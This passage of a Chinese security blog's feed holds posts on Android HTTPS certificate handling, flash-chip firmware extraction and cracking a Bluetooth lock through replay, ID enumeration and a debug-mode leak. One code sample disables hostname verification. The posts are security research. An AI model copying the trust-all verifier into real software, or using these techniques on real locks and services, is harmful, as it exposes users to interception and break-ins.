class="line">       <span class="comment">//使用默认证书  </span></div><div class="line">       KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());  </div><div class="line">       <span class="comment">//去掉系统默认证书  </span></div><div class="line">       keystore.load(<span class="keyword">null</span>);  </div><div class="line">       Certificate certificate =            CertificateFactory.getInstance(<span class="string">"X.509"</span>).generateCertificate(stream);  </div><div class="line">       <span class="comment">//设置自己的证书  </span></div><div class="line">       keystore.setCertificateEntry(<span class="string">"skxy"</span>, certificate);  </div><div class="line">       <span class="comment">//通过信任管理器获取一个默认的算法  </span></div><div class="line">       String algorithm = TrustManagerFactory.getDefaultAlgorithm();  </div><div class="line">       <span class="comment">//算法工厂创建  </span></div><div class="line">       TrustManagerFactory instance = TrustManagerFactory.getInstance(algorithm);  </div><div class="line">       instance.init(keystore);  </div><div class="line">       tls.init(<span class="keyword">null</span>, instance.getTrustManagers(), <span class="keyword">null</span>);  </div><div class="line">       SSLSocketFactory socketFactory = tls.getSocketFactory();  </div><div class="line">       HttpsURLConnection.setDefaultSSLSocketFactory(socketFactory);  </div><div class="line">       URL url = <span class="keyword">new</span> URL(path);  </div><div class="line">       HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();  </div><div class="line">       <span class="comment">//设置ip授权认证：如果已经安装该证书，可以不设置，否则需要设置  </span></div><div class="line">       conn.setHostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;  </div><div class="line">           @Override  </div><div class="line">           <span class="keyword">public</span> boolean verify(String hostname, SSLSession session) &#123;  </div><div class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;  </div><div class="line"></div><div class="line">           &#125;  </div><div class="line"></div><div class="line">       &#125;);  </div><div class="line">       InputStream inputStream = conn.getInputStream();  </div><div class="line">       String result = getString(inputStream);  </div><div class="line">       stream.close();</div></pre></td></tr></table></figure></p>
<h3 id="单向认证过程："><a href="#单向认证过程：" class="headerlink" title="单向认证过程："></a>单向认证过程：</h3><p>(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。<br>(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书<br>(3) 客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 1.证书是否过期<br> 2.发型服务器证书的CA是否可靠<br> 3.返回的公钥是否能正确解开返回证书中的数字签名<br> 4.服务器证书上的域名是否和服务器的实际域名相匹配<br> 5.验证通过后，将继续进行通信，否则，终止通信<br>(4) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择<br>(5) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。<br>(6) 服务器将选择好的加密方案通过明文方式返回给客户端<br>(7) 客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器<br>(8) 服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。<br>在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</p>
<h3 id="Https双向认证机制"><a href="#Https双向认证机制" class="headerlink" title="Https双向认证机制"></a>Https双向认证机制</h3><p>首先对于双向证书验证，也就是说，客户端有自己的密钥，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。<br>客户端双向认证代码实现部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySSLSocketFactory</span> </span>&#123;</div><div class="line">?</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TYPE_BKS = <span class="string">"bks"</span>;<span class="comment">//证书类型</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TYPE_P12 = <span class="string">"PKCS12"</span>;<span class="comment">//证书类型</span></div><div class="line">?</div><div class="line">?</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_PASSWORD = <span class="string">"****"</span>;<span class="comment">//证书密码（应该是客户端证书密码）</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TRUST_PASSWORD = <span class="string">"***"</span>;<span class="comment">//授信证书密码（应该是服务端证书密码）</span></div><div class="line">?</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory getSocketFactory(Context context) &#123;</div><div class="line">?</div><div class="line">?</div><div class="line">        InputStream trust_input = context.getResources().openRawResource(R.raw.trust);<span class="comment">//服务器授信证书</span></div><div class="line">        InputStream client_input = context.getResources().openRawResource(R.raw.client);<span class="comment">//客户端证书</span></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">                    SSLContext sslContext = SSLContext.getInstance(<span class="string">"TLS"</span>); </div><div class="line">                    KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">                    trustStore.load(trust_input, KEY_STORE_TRUST_PASSWORD.toCharArray()); </div><div class="line">                    KeyStore keyStore = KeyStore.getInstance(KEY_STORE_TYPE_P12);  </div><div class="line">                    keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray());</div><div class="line">                    TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</div><div class="line">                    trustManagerFactory.init(trustStore);</div><div class="line">                    KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</div><div class="line">                   keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray());</div><div class="line">                   sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), <span class="keyword">new</span> SecureRandom());</div><div class="line">                   SSLSocketFactory factory = sslContext.getSocketFactory();</div><div class="line">                   <span class="keyword">return</span> factory;</div><div class="line">               &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> e) &#123;</div><div class="line">                           e.printStackTrace(); </div><div class="line">                          <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">               &#125; <span class="keyword">finally</span> &#123; </div><div class="line">                          <span class="keyword">try</span> &#123;</div><div class="line">                                trust_input.close(); </div><div class="line">                               client_input.close();</div><div class="line">                          &#125; <span class="keyword">catch</span> (IOException e) &#123; </div><div class="line">                               e.printStackTrace();  </div><div class="line">                         &#125; </div><div class="line">               &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="双向认证过程："><a href="#双向认证过程：" class="headerlink" title="双向认证过程："></a>双向认证过程：</h3><p>(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。<br>(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书<br> 客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 1.证书是否过期<br> 2.发型服务器证书的CA是否可靠<br> 3.返回的公钥是否能正确解开返回证书中的数字签名<br> 4.服务器证书上的域名是否和服务器的实际域名相匹配<br>(3) 验证通过后，将继续进行通信，否则，终止通信<br>(4) 服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端<br>(5) 验证客户端的证书，通过验证后，会获得客户端的公钥<br>(6) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择<br>(7) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式<br>(8) 将加密方案通过使用之前获取到的公钥进行加密，返回给客户端<br>(9) 客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端<br>(10) 服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</p>
<h2 id="我们身边的app中所使用的加密传输是怎样的呢？"><a href="#我们身边的app中所使用的加密传输是怎样的呢？" class="headerlink" title="我们身边的app中所使用的加密传输是怎样的呢？"></a>我们身边的app中所使用的加密传输是怎样的呢？</h2><p>某宝（金融类app）的数据加密分析（https单向认证） 为了更加清晰的了解https在实际项目中的应用，特意花了点时间分析了一个app的加密认证过程。app虽然加了部分混淆，但并没有加固，所以也不难分析。<br>（1）整个发送https post请求过程.ip以及域名都是固定的，证书也写死在app里。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/https_post.png" alt="img"><br>（2）https认证过程<br>判断代理服务器以及证书校验<br><img src="http://ozuqqvmm5.bkt.clouddn.com/https.png" alt="img"><br>证书校验过程<br>在获取证书的过程中，仅仅读取了证书的信息，并没有实现校验证书是否安全可靠的代码。这里就留下了安全隐患。使用第三方证书一样可以截获数据。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/setcer.png" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/getcer.png" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/iscer.png" alt="img"><br>数据解密过程<br>在数据解密过程也不够严谨，密钥和向量通过简单逆向分析就能获得。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/desDecode.png" alt="img"><br>解密key的获取方式：数据包名的md5<br><img src="http://ozuqqvmm5.bkt.clouddn.com/decode2.png" alt="img"><br>解密向量<br><img src="http://ozuqqvmm5.bkt.clouddn.com/decodeiv.png" alt="img"><br>通过这个简单分析，你还敢说你的数据是安全传输的吗？</p>
<h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>因为开发方便而信任所有证书<br><img src="http://ozuqqvmm5.bkt.clouddn.com/wrong.png" alt="img"><br>重写了校验机制，但并没有做任何检验SSL证书有效性。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/wrong2.png" alt="img"></p>
<h2 id="扩展-Java-Security安全体系知识延伸"><a href="#扩展-Java-Security安全体系知识延伸" class="headerlink" title="扩展 Java Security安全体系知识延伸"></a>扩展 Java Security安全体系知识延伸</h2><h3 id="Java-Security-背景知识"><a href="#Java-Security-背景知识" class="headerlink" title="Java Security 背景知识"></a>Java Security 背景知识</h3><p>Java Security其实是Java平台中一个比较独立的模块。除了软件实现上内容外，它实际上对应了一系列的规范。从Java2开始，Java Security包含主要三个重要的规范：</p>
<p>JavaCryptography Extension（简写为JCE），JCE所包含的内容有加解密，密钥交换，消息摘要（Message Digest，比如MD5等），密钥管理等。本文所涉及的大部分内容都属于JCE的范畴。<br>JavaSecure Socket Extension（简写为JSSE），JSSE所包含的内容就是Java层的SSL/TLS。简单点说，使用JSSE就可以创建SSL/TLS socket了。<br>JavaAuthentication and Authorization Service（简写为JAAS），JSSA和认证/授权有关。这部分内容在客户端接触得会比较少一点，所以本文不拟讨论它。<br>在上述三个子模块或规范中，JCE是JavaSecurity的大头，其他两个子模块JSSE和JAAS都依赖于它，比如SSL/TLS在工作过程中需要使用密钥对数据进行加解密，那么密钥的创建和使用就依靠JCE子模块了。 另外，既然和安全相关，那么对安全敏感的相关部门或政府肯定会有所干涉。Java是在美国被发明的，所以美国政府对于Java Security方面的出口（比如哪些模块，哪些功能能给其他国家使用）有相关的限制。例如，不允许出口的JCE（从软件实现上看，可能就是从Java官网上下载到的几个Jar包文件）支持一些高级的加解密功能（比如在密钥长度等方面有所限制）。</p>
<h3 id="JCE的介绍"><a href="#JCE的介绍" class="headerlink" title="JCE的介绍"></a>JCE的介绍</h3><p>JCE最初是作为JCA的扩展包开发的，旨在提供受美国出口控制条例管制的加密服务API和实现。JCE提供一个提供者实现和一组相关的API和包，以支持加密和解密，密钥的生成和协商以及消息验证算法，其中对加密和解密的支持包括对称加密、非对称加密、块加密和流加密。JCE还支持安全流和封装流对象。<br>JCE的架构模型如下图所示：<br><img src="http://ozuqqvmm5.bkt.clouddn.com/jce.jpg" alt="img"></p>
<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><p>1.不要忽略证书校验</p>
<p>2.保护好自己的密钥</p>
<p>3.尽量使用规范的https协议</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1.<a href="http://blog.csdn.net/xdd19910505/article/details/51926540" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/xdd19910505/article/details/51926540</a></p>
<p>2.<a href="https://www.cnblogs.com/xiekeli/p/5607107.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/xiekeli/p/5607107.html</a></p>
<p>3.<a href="http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html</a></p>
<p>4.<a href="https://www.waitalone.cn/bank-ssl-cap.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.waitalone.cn/bank-ssl-cap.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssl" scheme="http://www.future-sec.com/tags/ssl/"/>
    
      <category term="https" scheme="http://www.future-sec.com/tags/https/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-固件提取</title>
    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2017-11-27T11:00:50.268Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。</p>
<h2 id="编程器读取"><a href="#编程器读取" class="headerlink" title="编程器读取"></a>编程器读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image36.jpg" alt="img"></p>
<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image37.jpg" alt="img"></p>
<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image38.jpg" alt="img"></p>
<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image39.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image40.jpg" alt="img"></p>
<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image41.jpg" alt="img"></p>
<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image118.jpg" alt="img"></p>
<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image42.jpg" alt="img"></p>
<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image43.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image44.jpg" alt="img"></p>
<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image45.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>
<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image116.jpg" alt="img"></p>
<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image47.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image48.jpg" alt="img"></p>
<p>通过显微镜发现芯片型号为25L128。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image120.jpg" alt="img"></p>
<p>连接编程器读取固件并保存。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image49.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image50.jpg" alt="img"></p>
<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image52.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image119.jpg" alt="img"></p>
<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image51.jpg" alt="img"></p>
<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image54.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image53.jpg" alt="img"></p>
<p>在编程器中选择该型号，成功提取出固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image55.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image56.jpg" alt="img"></p>
<p>用binwalk解包固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image115.jpg" alt="img"></p>
<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image57.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image58.jpg" alt="img"></p>
<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image59.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image60.jpg" alt="img"></p>
<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image62.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image121.jpg" alt="img"></p>
<p>通过夹具连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image61.jpg" alt="img"></p>
<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image63.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image64.jpg" alt="img"></p>
<p>用binwalk解包固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image117.jpg" alt="img"></p>
<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。<br>通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image92.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image93.jpg" alt="img"></p>
<h3 id="热风枪和锡焊拆焊芯片读取固件"><a href="#热风枪和锡焊拆焊芯片读取固件" class="headerlink" title="热风枪和锡焊拆焊芯片读取固件"></a>热风枪和锡焊拆焊芯片读取固件</h3><p>设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image94.jpg" alt="img"></p>
<p>读取芯片固件并导出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image95.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;/p&gt;
&lt;h2 id=&quot;编程器读取&quot;&gt;
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>如何破解一个蓝牙锁</title>
    <link href="http://www.future-sec.com/how-to-crack-a-ble-lock.html"/>
    <id>http://www.future-sec.com/how-to-crack-a-ble-lock.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2017-11-27T11:01:32.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。</p>
<h2 id="蓝牙锁介绍"><a href="#蓝牙锁介绍" class="headerlink" title="蓝牙锁介绍"></a>蓝牙锁介绍</h2><p> 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage9.jpg" alt="img"></p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage10.jpg" alt="img"></p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage11.jpg" alt="img"></p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage12.jpg" alt="img"></p>
<h2 id="如何去破解一个蓝牙锁"><a href="#如何去破解一个蓝牙锁" class="headerlink" title="如何去破解一个蓝牙锁"></a>如何去破解一个蓝牙锁</h2><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage13.jpg" alt="img"></p>
<h3 id="目标介绍"><a href="#目标介绍" class="headerlink" title="目标介绍"></a>目标介绍</h3><p>这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage14.jpg" alt="img"></p>
<h3 id="内部构架"><a href="#内部构架" class="headerlink" title="内部构架"></a>内部构架</h3><p>显微镜查看电路板<br><img src="http://ozuqqvmm5.bkt.clouddn.com/IMG_2214.jpg" alt="img"></p>
<p>拆解<br><img src="http://ozuqqvmm5.bkt.clouddn.com/IMG_2216.jpg" alt="img"></p>
<p>蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用app初步连接探测，可以看到</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage16.jpg" alt="img"></p>
<h3 id="开锁流程"><a href="#开锁流程" class="headerlink" title="开锁流程"></a>开锁流程</h3><p>Logcat 查看app日志</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage17.jpg" alt="img"></p>
<p>流程为</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171123170725.jpg" alt="img"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>一般对于蓝牙锁的攻击方式有三种</p>
<p>1、重放攻击<br>2、暴力破解(6位数字)<br>3、云端漏洞</p>
<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage18.jpg" alt="img"></p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage19.jpg" alt="img"></p>
<p>通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。</p>
<h3 id="云端漏洞"><a href="#云端漏洞" class="headerlink" title="云端漏洞"></a>云端漏洞</h3><p>云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage20.jpg" alt="img"></p>
<p>没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage21.jpg" alt="img"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。<br>工作流程为</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171123170725.jpg" alt="img"></p>
<p>利用 com.inuker.bluetooth 库快速开发</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage22.jpg" alt="img"></p>
<p>APP界面</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15117578788731.jpg" alt="img"></p>
<p>视频演示</p>
<p> <a href="https://v.qq.com/x/page/b051058vicv.html" rel="external nofollow noopener noreferrer" target="_blank">https://v.qq.com/x/page/b051058vicv.html</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ti官方页面  <a href="http://www.ti.com.cn/product/cn/CC2541" rel="external nofollow noopener noreferrer" target="_blank">http://www.ti.com.cn/product/cn/CC2541</a><br>cc2541蓝牙芯片手册  <a href="https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html" rel="external nofollow noopener noreferrer" target="_blank">https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html</a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
